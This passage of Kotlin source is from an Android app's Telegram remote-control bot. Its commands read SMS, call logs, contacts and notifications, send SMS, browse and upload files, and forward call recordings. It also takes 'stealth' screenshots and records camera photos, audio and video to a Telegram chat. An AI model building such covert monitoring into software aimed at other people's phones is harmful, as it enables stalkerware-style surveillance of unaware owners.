                        if (path == null) sendMessage("⚠️ Image session expired. Send /images again.")
                        else cbSendMediaImage(path)
                    }
                    // ---- Pomodoro ----
                    "pom_start" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "▶️ Starting…")
                        val secs = try {
                            PomodoroSettingsPreference.getValueAsync(MainApp.instance).workDuration * 60
                        } catch (_: Throwable) { 25 * 60 }
                        sendEvent(HttpApiEvents.PomodoroStartEvent(secs))
                        renderPomodoroStatus(editMessageId = messageId)
                    }
                    "pom_pause" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "⏸ Paused")
                        sendEvent(HttpApiEvents.PomodoroPauseEvent())
                        renderPomodoroStatus(editMessageId = messageId)
                    }
                    "pom_stop" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId, "⏹ Stopped")
                        sendEvent(HttpApiEvents.PomodoroStopEvent())
                        renderPomodoroStatus(editMessageId = messageId)
                    }
                    "pom_refresh" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        renderPomodoroStatus(editMessageId = messageId)
                    }
                    // ---- Torch / find phone / quick toggles ----
                    "torch_on" -> {
                        try { UtilitiesHelper.setTorch(true); TelegramApiClient.answerCallbackQuery(token, cqId, "🔦 ON") }
                        catch (e: Exception) { TelegramApiClient.answerCallbackQuery(token, cqId, "Failed", true) }
                        renderTorchState(editMessageId = messageId)
                    }
                    "torch_off" -> {
                        try { UtilitiesHelper.setTorch(false); TelegramApiClient.answerCallbackQuery(token, cqId, "🔦 OFF") }
                        catch (_: Exception) { TelegramApiClient.answerCallbackQuery(token, cqId, "Failed", true) }
                        renderTorchState(editMessageId = messageId)
                    }
                    "fp_on" -> {
                        LocateRingService.start()
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🚨 Alarm started")
                        renderFindPhoneState(editMessageId = messageId)
                    }
                    "fp_off" -> {
                        LocateRingService.stop()
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔕 Alarm stopped")
                        renderFindPhoneState(editMessageId = messageId)
                    }
                    "wifi_on" -> {
                        WifiControlHelper.setWifiEnabled(true, MainApp.instance)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "📶 Enabling…")
                        kotlinx.coroutines.delay(800)
                        renderWifiState(editMessageId = messageId)
                    }
                    "wifi_off" -> {
                        WifiControlHelper.setWifiEnabled(false, MainApp.instance)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "📶 Disabling…")
                        kotlinx.coroutines.delay(800)
                        renderWifiState(editMessageId = messageId)
                    }
                    "vol_set" -> {
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val stream = rest.substring(0, sep)
                        val pct = rest.substring(sep + 1).toIntOrNull() ?: 50
                        UtilitiesHelper.setVolume(stream, pct)
                        TelegramApiClient.answerCallbackQuery(token, cqId, "🔊 $stream → $pct%")
                        renderVolumeState(editMessageId = messageId)
                    }
                    "br_set" -> {
                        val pct = rest.toIntOrNull() ?: 50
                        val ok = UtilitiesHelper.setBrightness(pct)
                        if (ok) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🔆 $pct%")
                            renderBrightnessState(editMessageId = messageId)
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "Need WRITE_SETTINGS perm", true)
                        }
                    }
                    // ---- Launcher ----
                    "lpg" -> {
                        TelegramApiClient.answerCallbackQuery(token, cqId)
                        val sep = rest.lastIndexOf(':')
                        if (sep < 0) return@launch
                        val q = rest.substring(0, sep).let { if (it == "_") "" else it }
                        val off = rest.substring(sep + 1).toIntOrNull() ?: 0
                        renderLaunchAppsPage(q, off, editMessageId = messageId)
                    }
                    "lrun" -> {
                        val pkg = pkgFromToken(rest) ?: rest
                        val ok = AppLauncherHelper.launch(pkg)
                        if (ok) {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "🚀 Launched")
                            sendMessage("🚀 Launched <code>${htmlEsc(pkg)}</code> on the device.")
                        } else {
                            TelegramApiClient.answerCallbackQuery(token, cqId, "No launch intent", true)
                        }
                    }
                    else -> TelegramApiClient.answerCallbackQuery(token, cqId)
                }
            } catch (e: Exception) {
                LogCat.e("TelegramBot callback error: ${e.message}")
                TelegramApiClient.answerCallbackQuery(token, cqId, "Error: ${e.message?.take(100)}", true)
            }
        }
    }

    private suspend fun cbSendRecording(filename: String) {
        try {
            val safe = filename.substringAfterLast('/').substringAfterLast('\\')
            val file = java.io.File(CallRecorderHelper.recordingsDir(MainApp.instance), safe)
            if (!file.exists() || !file.isFile) {
                sendMessage("❌ Recording not found: <code>${htmlEsc(safe)}</code>")
                return
            }
            sendUploadDocument()
            val meta = CallRecorderHelper.list().firstOrNull { it.filename == safe }
            val durSec = ((meta?.durationMs ?: 0L) / 1000).toInt().coerceAtLeast(1)
            val name = meta?.displayName?.ifBlank { meta.source } ?: safe
            val caption = "🎙 ${htmlEsc(name)} · ${formatDuration(meta?.durationMs ?: 0L)} · ${file.length() / 1024} KB"
            val ok = TelegramApiClient.sendAudio(token, chatId, file, caption, durSec)
            if (!ok) {
                // Audio send failed (Telegram is picky about codecs); fall back to document.
                TelegramApiClient.sendDocument(token, chatId, file, caption)
            }
        } catch (e: Exception) {
            sendMessage("❌ Could not send recording: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun registerCommands() {
        TelegramApiClient.setMyCommands(token, allCommands.map { it.first to it.second.replace(Regex("<[^>]+>"), "") })
    }

    private fun sendTyping() = TelegramApiClient.sendChatAction(token, chatId, "typing")
    private fun sendUploadPhoto() = TelegramApiClient.sendChatAction(token, chatId, "upload_photo")
    private fun sendUploadDocument() = TelegramApiClient.sendChatAction(token, chatId, "upload_document")
    private fun sendRecordVoice() = TelegramApiClient.sendChatAction(token, chatId, "record_voice")
    private fun sendUploadVideo() = TelegramApiClient.sendChatAction(token, chatId, "upload_video")

    private suspend fun cmdStart() {
        sendTyping()
        val info = buildString {
            append("🤖 <b>PlainApp Bot</b> — device remote control\n\n")
            append("📱 <b>Device:</b> ${htmlEsc(PhoneHelper.getDeviceName(MainApp.instance))}\n")
            append("🤖 <b>Android:</b> ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})\n")
            append("🕐 <b>Time:</b> ${ts}\n\n")
            val bat = BatteryHistoryHelper.sampleNow(MainApp.instance)
            if (bat != null) {
                append("🔋 <b>Battery:</b> ${bat.level}% ${if (bat.plugged > 0) "⚡ charging" else ""}\n")
            }
            val call = LiveCallTracker.snapshot()
            if (call.state != "idle") {
                append("📞 <b>Call:</b> ${call.state} (${call.direction})\n")
            }
            append("\nSend /help to see all available commands.")
        }
        sendMessage(info)
    }

    private suspend fun cmdHelp() {
        sendTyping()
        val sb = StringBuilder("📖 <b>PlainApp Bot — All Commands</b>\n\n")
        allCommands.forEach { (cmd, desc) ->
            sb.append("/<code>$cmd</code> — $desc\n")
        }
        sb.append("\n💡 <i>Live alerts are auto-forwarded for calls, SMS & notifications.</i>")
        sendMessage(sb.toString())
    }

    private suspend fun cmdMessages(args: List<String>) {
        sendTyping()
        val limit = min(args.firstOrNull()?.toIntOrNull() ?: 20, 100)
        try {
            val convs = SmsConversationHelper.searchConversationsAsync(MainApp.instance, "", limit, 0)
            if (convs.isEmpty()) { sendMessage("💬 No SMS conversations found."); return }
            val sb = StringBuilder("💬 <b>Recent SMS Conversations</b> (${convs.size})\n")
            sb.append("<i>Tap a conversation to open the thread.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            convs.forEachIndexed { i, c ->
                val addr = c.address.ifBlank { "Thread ${c.id}" }
                sb.append("${i + 1}. 📱 <b>${htmlEsc(addr)}</b>")
                if (!c.read) sb.append("  🔴")
                sb.append("\n   💬 ${htmlEsc(c.snippet.take(80))}\n")
                sb.append("   🕐 ${fmtTime(c.date.toEpochMilliseconds())}  ·  📬 ${c.messageCount} msgs\n\n")
                val label = "${i + 1}. ${addr.take(20)}"
                rows.add(listOf(label to "sms_open:${c.id}"))
            }
            sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
        } catch (e: Exception) {
            sendMessage("❌ Could not read SMS: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdSmsThread(args: List<String>) {
        if (args.isEmpty()) { sendMessage("Usage: /sms &lt;thread_id&gt;\n\nUse /messages to list conversations and tap one to open."); return }
        sendTyping()
        val threadId = args[0].trim().filter { it.isDigit() }
        if (threadId.isEmpty()) { sendMessage("❌ Invalid thread id: <code>${htmlEsc(args[0])}</code>"); return }
        renderSmsThreadPage(threadId, offset = 0, editMessageId = null)
    }

    private suspend fun renderSmsThreadPage(threadId: String, offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 10
            val messages = SmsHelper.searchAsync(MainApp.instance, "thread_id:$threadId", pageSize + 1, offset)
            val hasMore = messages.size > pageSize
            val pageItems = messages.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📭 No messages in thread $threadId" else "📭 No more messages."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("📨 <b>Thread $threadId</b> · Showing ${offset + 1}–${offset + pageItems.size}\n\n")
            // Show oldest-first within the page so threading reads naturally.
            pageItems.reversed().forEach { m ->
                val dir = if (m.type == 1) "📥" else "📤"
                sb.append("$dir <b>${htmlEsc(m.address.ifBlank { "(unknown)" })}</b>  <i>${fmtTime(m.date.toEpochMilliseconds())}</i>\n")
                sb.append("   ${htmlEsc(m.body.take(300))}\n\n")
            }
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "sms_pg:$threadId:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "sms_pg:$threadId:${offset + pageSize}")
            val markup = if (nav.isNotEmpty()) TelegramApiClient.inlineKeyboard(listOf(nav)) else null
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read thread: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private fun cmdSendSms(args: List<String>) {
        if (args.size < 2) { sendMessage("Usage: /sendsms <number> <message text>"); return }
        val number = args[0]
        val text = args.drop(1).joinToString(" ")
        try {
            SmsHelper.sendText(number, text)
            sendMessage("✅ SMS sent to <code>${htmlEsc(number)}</code>:\n<i>${htmlEsc(text)}</i>")
        } catch (e: Exception) {
            sendMessage("❌ Failed to send SMS: ${htmlEsc(e.message ?: "")}")
        }
    }

    private suspend fun cmdCalls(args: List<String>) {
        sendTyping()
        // Optional explicit offset: /calls 20
        val off = args.firstOrNull()?.toIntOrNull()?.coerceAtLeast(0) ?: 0
        renderCallsPage(off, editMessageId = null)
    }

    private suspend fun renderCallsPage(offset: Int, editMessageId: Long?) {
        try {
            val pageSize = 10
            val calls = CallMediaStoreHelper.searchAsync(MainApp.instance, "", pageSize + 1, offset)
            val hasMore = calls.size > pageSize
            val pageItems = calls.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "📞 No call log entries." else "📞 No more entries."
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            val sb = StringBuilder("📞 <b>Recent Calls</b> · Showing ${offset + 1}–${offset + pageItems.size}\n\n")
            pageItems.forEachIndexed { i, c ->
                val typeEmoji = when (c.type) {
                    CallLog.Calls.INCOMING_TYPE -> "📲 Incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "📤 Outgoing"
                    CallLog.Calls.MISSED_TYPE -> "❌ Missed"
                    CallLog.Calls.REJECTED_TYPE -> "🚫 Rejected"
                    else -> "📞 Unknown"
                }
                val dur = if (c.duration > 0) " · ${c.duration}s" else ""
                val name = if (c.name.isNotBlank()) " (${htmlEsc(c.name)})" else ""
                sb.append("${offset + i + 1}. $typeEmoji${dur}\n")
                sb.append("   📱 <code>${htmlEsc(c.number)}</code>$name\n")
                sb.append("   🕐 ${fmtTime(c.startedAt.toEpochMilliseconds())}\n\n")
            }
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "calls_pg:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "calls_pg:${offset + pageSize}")
            val markup = if (nav.isNotEmpty()) TelegramApiClient.inlineKeyboard(listOf(nav)) else null
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Could not read call log: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private suspend fun cmdRecordings(args: List<String>) {
        sendTyping()
        val limit = min(args.firstOrNull()?.toIntOrNull() ?: 20, 100)
        try {
            val recordings = CallRecorderHelper.list().take(limit)
            if (recordings.isEmpty()) {
                sendMessage("🎙️ No call recordings found. Enable call recording in PlainApp settings.")
                return
            }
            val sb = StringBuilder("🎙️ <b>Call Recordings</b> (${recordings.size})\n")
            sb.append("<i>Tap a recording to download it.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            recordings.forEachIndexed { i, m ->
                val dirEmoji = if (m.direction == "incoming") "📲" else "📞"
                val dur = formatDuration(m.durationMs)
                val name = m.displayName.ifBlank { m.source }
                sb.append("${i + 1}. $dirEmoji <b>${htmlEsc(name)}</b>\n")
                sb.append("   ⏱ $dur  ·  📦 ${m.sizeBytes / 1024} KB\n")
                sb.append("   🕐 ${fmtTime(m.startedAt)}  ·  <i>via ${htmlEsc(m.source)}</i>\n\n")
                rows.add(listOf("📥 ${i + 1}. ${name.take(20)} · $dur" to "rec_get:${m.filename.take(50)}"))
                if (sb.length > 3500) { sb.append("…truncated"); return@forEachIndexed }
            }
            sb.append("\n<i>💡 Recordings are auto-sent when a call ends.</i>")
            sendMessage(sb.toString(), replyMarkup = TelegramApiClient.inlineKeyboard(rows))
        } catch (e: Exception) {
            sendMessage("❌ Could not read recordings: ${htmlEsc(e.message ?: "")}")
        }
    }

    /** Last list state, used so the contact-detail "Back to list" button restores the right page. */
    @Volatile private var lastContactsQuery: String = ""
    @Volatile private var lastContactsOffset: Int = 0

    private suspend fun cmdContacts(args: List<String>) {
        sendTyping()
        val query = if (args.isNotEmpty()) "text:${args.joinToString(" ")}" else ""
        renderContactsPage(query, 0, editMessageId = null)
    }

    private suspend fun renderContactsPage(query: String, offset: Int, editMessageId: Long?) {
        lastContactsQuery = query
        lastContactsOffset = offset
        try {
            val pageSize = 20
            val contacts = ContactMediaStoreHelper.searchAsync(MainApp.instance, query, pageSize + 1, offset)
            val hasMore = contacts.size > pageSize
            val pageItems = contacts.take(pageSize)
            if (pageItems.isEmpty()) {
                val msg = if (offset == 0) "👥 No contacts found." else "👥 No more contacts."
                if (editMessageId != null) {
                    TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                } else sendMessage(msg)
                return
            }
            val title = if (query.isEmpty()) "👥 <b>Contacts</b>" else "👥 <b>Contacts</b> · <i>${htmlEsc(query.removePrefix("text:"))}</i>"
            val sb = StringBuilder("$title  ·  Showing ${offset + 1}–${offset + pageItems.size}\n")
            sb.append("<i>Tap a contact to call, message, or share.</i>\n\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, c ->
                val display = contactDisplayName(c)
                val firstPhone = c.phoneNumbers.firstOrNull()?.value
                val previewPhone = if (firstPhone != null) "  ·  📞 ${htmlEsc(firstPhone)}" else ""
                sb.append("${offset + i + 1}. 👤 <b>${htmlEsc(display)}</b>$previewPhone\n")
                if (c.organization != null && c.organization!!.company.isNotBlank()) {
                    sb.append("   🏢 ${htmlEsc(c.organization!!.company)}\n")
                }
                // 1-button row per contact = clean modern list
                val q = query.ifEmpty { "_" }
                val btnLabel = "${offset + i + 1}. ${display.take(28)}"
                rows.add(listOf(btnLabel to "c_view:${c.id}:$q:$offset"))
            }
            val nav = mutableListOf<Pair<String, String>>()
            val q = query.ifEmpty { "_" }
            if (offset > 0) nav.add("◀️ Prev" to "contacts_pg:$q:${(offset - pageSize).coerceAtLeast(0)}")
            if (hasMore) nav.add("Next ▶️" to "contacts_pg:$q:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) {
                TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            } else {
                sendMessage(sb.toString(), replyMarkup = markup)
            }
        } catch (e: Exception) {
            sendMessage("❌ Could not read contacts: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun cmdNotifications(args: List<String>) {
        val limit = min(args.firstOrNull()?.toIntOrNull() ?: 15, 50)
        val list = NotificationLogHelper.all().takeLast(limit).reversed()
        if (list.isEmpty()) { sendMessage("🔔 No recent notifications."); return }
        val sb = StringBuilder("🔔 <b>Recent Notifications</b> (${list.size})\n\n")
        list.forEachIndexed { i, n ->
            sb.append("${i + 1}. 📱 <code>${htmlEsc(n.appName)}</code>\n")
            if (!n.title.isNullOrBlank()) sb.append("   📌 <b>${htmlEsc(n.title.take(80))}</b>\n")
            if (!n.body.isNullOrBlank()) sb.append("   💬 ${htmlEsc(n.body.take(150))}\n")
            sb.append("   🕐 ${fmtTime(n.time.toEpochMilliseconds())}\n\n")
            if (sb.length > 3500) { sb.append("…truncated"); return@forEachIndexed }
        }
        sendMessage(sb.toString())
    }

    private fun cmdLogs(args: List<String>) {
        val limit = min(args.firstOrNull()?.toIntOrNull() ?: 30, 200)
        val list = NotificationLogHelper.all().takeLast(limit).reversed()
        if (list.isEmpty()) { sendMessage("📋 No notification logs."); return }
        val sb = StringBuilder("📋 <b>Notification Log</b> (last ${list.size})\n\n")
        list.forEachIndexed { i, n ->
            sb.append("${i + 1}. <b>${htmlEsc(n.appName)}</b> · ${fmtTime(n.time.toEpochMilliseconds())}\n")
            if (!n.title.isNullOrBlank()) sb.append("   📌 ${htmlEsc(n.title.take(60))}\n")
            if (!n.body.isNullOrBlank()) sb.append("   💬 ${htmlEsc(n.body.take(100))}\n")
            sb.append("\n")
            if (sb.length > 3600) { sb.append("…truncated (${list.size - i - 1} more)"); return@forEachIndexed }
        }
        sendMessage(sb.toString())
    }

    /** Stable short-token cache so long paths fit Telegram's 64-byte callback_data limit. */
    /** Holds a one-shot pending-input action keyed for the only authorised chat (single-chat bot). */
    @Volatile private var pendingInput: String? = null

    private val pathTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
    private fun pathToken(path: String): String {
        val md = java.security.MessageDigest.getInstance("MD5")
        val hex = md.digest(path.toByteArray()).joinToString("") { "%02x".format(it) }.take(12)
        pathTokens[hex] = path
        return hex
    }
    private fun pathFromToken(token: String): String? = pathTokens[token]

    /** Phone-number tokens — keeps callback_data short and avoids escaping issues with +, spaces, etc. */
    private val phoneTokens = java.util.concurrent.ConcurrentHashMap<String, String>()
    private fun phoneToken(num: String): String {
        val md = java.security.MessageDigest.getInstance("MD5")
        val hex = md.digest(num.toByteArray()).joinToString("") { "%02x".format(it) }.take(10)
        phoneTokens[hex] = num
        return hex
    }
    private fun phoneFromToken(t: String): String? = phoneTokens[t]

    private fun cmdFiles(args: List<String>) {
        val path = if (args.isNotEmpty()) args.joinToString(" ") else defaultStorageRoot()
        scope.launch { renderFolderPage(path, offset = 0, editMessageId = null) }
    }

    private fun defaultStorageRoot(): String {
        val ext = android.os.Environment.getExternalStorageDirectory()
        return if (ext != null && ext.exists()) ext.absolutePath else "/sdcard"
    }

    private fun renderFolderPage(path: String, offset: Int, editMessageId: Long?) {
        try {
            val dir = File(path)
            if (!dir.exists()) {
                val msg = "❌ Path not found: <code>${htmlEsc(path)}</code>"
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }
            if (!dir.isDirectory) { renderFileView(path, editMessageId); return }
            val items = try {
                dir.listFiles()?.sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() })) ?: emptyList()
            } catch (_: SecurityException) { null }
            if (items == null) {
                val msg = "⛔ Permission denied: <code>${htmlEsc(path)}</code>"
                if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
                else sendMessage(msg)
                return
            }

            val pageSize = 12
            val total = items.size
            val pageItems = items.drop(offset).take(pageSize)
            val sb = StringBuilder("📂 <b>${htmlEsc(path)}</b>\n")
            sb.append("<i>${total} items · tap a folder to open, a file to view & download.</i>\n")
            if (total > pageSize) sb.append("Showing ${offset + 1}–${offset + pageItems.size}\n")
            sb.append("\n")
            val rows = mutableListOf<List<Pair<String, String>>>()
            pageItems.forEachIndexed { i, f ->
                val idx = offset + i + 1
                val icon = if (f.isDirectory) "📁" else fileIcon(f.name)
                val sizeText = if (f.isFile) "${humanSize(f.length())}" else "${try { f.listFiles()?.size ?: 0 } catch (_: SecurityException) { 0 }} items"
                sb.append("${idx}. $icon <code>${htmlEsc(f.name.take(60))}</code> · $sizeText\n")
                val tok = pathToken(f.absolutePath)
                val cb = if (f.isDirectory) "files_pg:$tok:0" else "file_view:$tok"
                val label = "$icon ${idx}. ${f.name.take(28)}"
                rows.add(listOf(label to cb))
            }

            // Navigation row(s)
            val nav = mutableListOf<Pair<String, String>>()
            if (offset > 0) nav.add("◀️ Prev" to "files_pg:${pathToken(path)}:${(offset - pageSize).coerceAtLeast(0)}")
            val parent = dir.parentFile?.absolutePath
            if (parent != null && parent != path) nav.add("⬆️ Up" to "files_pg:${pathToken(parent)}:0")
            if (offset + pageSize < total) nav.add("Next ▶️" to "files_pg:${pathToken(path)}:${offset + pageSize}")
            if (nav.isNotEmpty()) rows.add(nav)
            // Quick-jump shortcuts when at the default root with empty parent only
            if (offset == 0 && parent == null) {
                rows.add(listOf("🏠 /sdcard" to "files_pg:${pathToken("/sdcard")}:0"))
            }

            val markup = TelegramApiClient.inlineKeyboard(rows)
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
            else sendMessage(sb.toString(), replyMarkup = markup)
        } catch (e: Exception) {
            val msg = "❌ Error: ${htmlEsc(e.message ?: "")}"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
        }
    }

    private fun renderFileView(path: String, editMessageId: Long?) {
        val f = File(path)
        if (!f.exists()) {
            val msg = "❌ File not found: <code>${htmlEsc(path)}</code>"
            if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, msg)
            else sendMessage(msg)
            return
        }
        if (f.isDirectory) { renderFolderPage(path, 0, editMessageId); return }
        val parent = f.parentFile?.absolutePath ?: "/"
        val sizeBytes = f.length()
        val sb = StringBuilder()
        sb.append("📄 <b>${htmlEsc(f.name)}</b>\n\n")
        sb.append("📁 <code>${htmlEsc(parent)}</code>\n")
        sb.append("💾 ${humanSize(sizeBytes)}  (${sizeBytes} bytes)\n")
        sb.append("🕐 Modified: ${fmtTime(f.lastModified())}\n")
        sb.append("🔧 Readable: ${if (f.canRead()) "yes" else "no"}\n")
        if (sizeBytes > UPLOAD_LIMIT_BYTES) {
            sb.append("\n⚠️ <i>File is larger than ${UPLOAD_LIMIT_BYTES / (1024 * 1024)} MB — Telegram bot uploads are capped at this size.</i>")
        }
        val rows = mutableListOf<List<Pair<String, String>>>()
        if (f.canRead() && sizeBytes <= UPLOAD_LIMIT_BYTES && sizeBytes > 0) {
            rows.add(listOf("📥 Download original" to "file_get:${pathToken(path)}"))
        }
        rows.add(listOf("⬆️ Back to folder" to "files_pg:${pathToken(parent)}:0"))
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, sb.toString(), replyMarkup = markup)
        else sendMessage(sb.toString(), replyMarkup = markup)
    }

    private suspend fun cbSendFile(path: String) {
        try {
            val f = File(path)
            if (!f.exists() || !f.isFile) { sendMessage("❌ File no longer exists: <code>${htmlEsc(path)}</code>"); return }
            if (!f.canRead()) { sendMessage("⛔ Not readable: <code>${htmlEsc(path)}</code>"); return }
            if (f.length() > UPLOAD_LIMIT_BYTES) {
                sendMessage("⚠️ File too large for Telegram (${humanSize(f.length())} > ${UPLOAD_LIMIT_BYTES / (1024 * 1024)} MB).")
                return
            }
            sendUploadDocument()
            val caption = "📄 ${htmlEsc(f.name)} · ${humanSize(f.length())}"
            val ok = TelegramApiClient.sendDocument(token, chatId, f, caption)
            if (!ok) sendMessage("❌ Upload failed: <code>${htmlEsc(f.name)}</code>")
        } catch (e: Exception) {
            sendMessage("❌ Could not send file: ${htmlEsc(e.message ?: "")}")
        }
    }

    private fun humanSize(bytes: Long): String {
        if (bytes < 1024) return "$bytes B"
        val kb = bytes / 1024.0
        if (kb < 1024) return "%.1f KB".format(kb)
        val mb = kb / 1024.0
        if (mb < 1024) return "%.1f MB".format(mb)
        return "%.2f GB".format(mb / 1024.0)
    }

    /** Telegram bot API document upload limit. */
    private val UPLOAD_LIMIT_BYTES = 50L * 1024L * 1024L

    private suspend fun cmdScreenshot() {
        sendMessage("📸 Taking screenshot…")
        sendUploadPhoto()
        try {
            val shot = StealthScreenshotCapturer.captureNow(manual = true)
            if (shot == null) {
                sendMessage("❌ Screenshot failed. Ensure Accessibility Service is enabled in PlainApp settings.")
                return
            }
            val file = File(shot.absPath)
            if (!file.exists()) { sendMessage("❌ Screenshot file not found."); return }
            val caption = "📸 Screenshot · ${shot.width}×${shot.height} · ${shot.sizeBytes / 1024} KB · ${ts}"
            TelegramApiClient.sendPhoto(token, chatId, file, caption)
        } catch (e: Exception) {
            sendMessage("❌ Screenshot error: ${htmlEsc(e.message ?: "")}")
        }
    }

    @SuppressLint("MissingPermission")
    private suspend fun cmdPhoto(args: List<String>) {
        val useFront = args.firstOrNull()?.lowercase() == "front"
        sendMessage("📷 Capturing ${if (useFront) "front" else "back"} camera photo…")
        sendUploadPhoto()
        val file = capturePhoto(MainApp.instance, useFront)
        if (file != null) {
            TelegramApiClient.sendPhoto(token, chatId, file, "📷 ${if (useFront) "Front" else "Back"} camera · ${ts}")
            file.delete()
        } else {
            sendMessage("❌ Photo capture failed. Ensure Camera permission is granted.")
        }
    }

    private fun cmdAudio(args: List<String>) {
        // Backwards compat: `/audio 30` immediately starts a 30s recording.
        val direct = args.firstOrNull()?.toIntOrNull()
        if (direct != null) {
            scope.launch { runAudioRecording(direct.coerceIn(1, 300)) }
            return
        }
        showAudioDurationMenu(editMessageId = null)
    }

    private fun showAudioDurationMenu(editMessageId: Long?) {
        val text = "🎙 <b>Record audio</b>\n\nChoose a duration:"
        val rows = listOf(
            listOf("5s" to "aud:5", "10s" to "aud:10", "30s" to "aud:30"),
            listOf("1 min" to "aud:60", "2 min" to "aud:120", "5 min" to "aud:300"),
            listOf("⌨️ Custom…" to "aud:custom"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
        else sendMessage(text, replyMarkup = markup)
    }

    private suspend fun runAudioRecording(seconds: Int) {
        sendMessage("🎙 Recording ${seconds}s of audio…")
        sendRecordVoice()
        val file = recordAudio(MainApp.instance, seconds)
        if (file != null && file.exists() && file.length() > 0) {
            TelegramApiClient.sendAudio(token, chatId, file, "🎙 Audio · ${seconds}s · ${ts}", seconds)
            file.delete()
        } else {
            sendMessage("❌ Audio recording failed. Ensure Microphone permission is granted.")
        }
    }

    private fun cmdVideo(args: List<String>) {
        // Backwards compat: `/video 20 front` or `/video 20`.
        val firstNum = args.firstOrNull()?.toIntOrNull()
        if (firstNum != null) {
            val useFront = args.getOrNull(1)?.lowercase() == "front"
            scope.launch { runVideoRecording(firstNum.coerceIn(1, 120), useFront) }
            return
        }
        // `/video front` or `/video back` → skip camera picker, go straight to durations.
        val directCam = args.firstOrNull()?.lowercase()
        if (directCam == "front" || directCam == "back") {
            showVideoDurationMenu(useFront = directCam == "front", editMessageId = null)
            return
        }
        showVideoCameraMenu(editMessageId = null)
    }

    private fun showVideoCameraMenu(editMessageId: Long?) {
        val text = "🎬 <b>Record video</b>\n\nWhich camera?"
        val rows = listOf(
            listOf("📷 Back" to "vid_cam:back", "🤳 Front" to "vid_cam:front"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
        else sendMessage(text, replyMarkup = markup)
    }

    private fun showVideoDurationMenu(useFront: Boolean, editMessageId: Long?) {
        val cam = if (useFront) "front" else "back"
        val label = if (useFront) "🤳 Front" else "📷 Back"
        val text = "🎬 <b>Record video</b> · $label camera\n\nChoose a duration:"
        val rows = listOf(
            listOf("5s" to "vid:$cam:5", "10s" to "vid:$cam:10", "20s" to "vid:$cam:20"),
            listOf("30s" to "vid:$cam:30", "1 min" to "vid:$cam:60", "2 min" to "vid:$cam:120"),
            listOf("⌨️ Custom…" to "vid_custom:$cam"),
            listOf("◀️ Change camera" to "vid_cam_pick"),
        )
        val markup = TelegramApiClient.inlineKeyboard(rows)
        if (editMessageId != null) TelegramApiClient.editMessageText(token, chatId, editMessageId, text, replyMarkup = markup)
        else sendMessage(text, replyMarkup = markup)
    }

    private suspend fun runVideoRecording(seconds: Int, useFront: Boolean) {
        sendMessage("🎬 Recording ${seconds}s video (${if (useFront) "front" else "back"} camera)…")
        sendUploadVideo()
